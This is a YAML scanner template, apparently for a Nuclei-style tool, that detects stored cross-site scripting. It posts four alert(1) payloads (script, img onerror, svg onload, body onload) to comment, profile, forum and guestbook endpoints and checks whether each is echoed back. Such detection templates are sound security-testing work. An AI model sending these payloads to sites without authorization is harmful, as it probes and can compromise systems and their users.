id: vf-high-stored-xss-01

name: Advanced Stored Cross-Site Scripting Detection

severity: High

category: XSS

requests:

  - id: comment-script
    method: POST
    path: "/comments"
    body: "comment=<script>alert(1)</script>"
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      type: word
      words:
        - "<script>alert(1)</script>"

  - id: profile-bio
    method: POST
    path: "/profile"
    body: "bio=<img src=x onerror=alert(1)>"
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      type: word
      words:
        - "<img src=x onerror=alert(1)>"

  - id: forum-post
    method: POST
    path: "/post"
    body: "content=<svg onload=alert(1)>"
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      type: word
      words:
        - "<svg onload=alert(1)>"

  - id: guestbook
    method: POST
    path: "/guestbook"
    body: "message=<body onload=alert(1)>"
    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      type: word
      words:
        - "<body onload=alert(1)>"

metadata:

  parameters:
    - comment
    - message
    - bio
    - content
    - description
    - feedback
    - review
    - post
